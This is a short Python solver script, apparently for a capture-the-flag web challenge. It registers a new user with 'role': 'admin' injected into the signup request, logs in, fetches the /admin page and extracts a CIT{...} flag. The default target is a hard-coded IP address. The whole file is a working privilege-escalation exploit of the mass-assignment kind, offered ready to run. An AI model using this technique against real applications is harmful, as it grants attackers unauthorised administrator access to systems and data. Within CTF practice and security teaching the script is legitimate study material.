#!/usr/bin/env -S uv run
# /// script
# dependencies = [
#   "requests>=2.32.0",
# ]
# ///

import re
import sys
import uuid

import requests


def fail(message: str) -> "NoReturn":
    raise SystemExit(message)


def main() -> None:
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://23.179.17.92:5556"
    base_url = base_url.rstrip("/")

    session = requests.Session()
    session.trust_env = False

    username = f"admin{uuid.uuid4().hex[:10]}"
    password = "Aa!23456"

    register_payload = {
        "username": username,
        "password": password,
        "full_name": "solver",
        "title": "eng",
        "team": "ops",
        "role": "admin",
    }

    response = session.post(
        f"{base_url}/api/register",
        json=register_payload,
        timeout=10,
    )
    if response.status_code != 200:
        fail(f"registration failed: {response.status_code} {response.text}")

    response = session.post(
        f"{base_url}/api/login",
        json={"username": username, "password": password},
        timeout=10,
    )
    if response.status_code != 200:
        fail(f"login failed: {response.status_code} {response.text}")

    response = session.get(f"{base_url}/admin", timeout=10)
    if response.status_code != 200:
        fail(f"admin request failed: {response.status_code} {response.text}")

    match = re.search(r"CIT\{[^}]+\}", response.text)
    if not match:
        fail("flag not found in admin page")

    print(match.group(0))


if __name__ == "__main__":
    main()
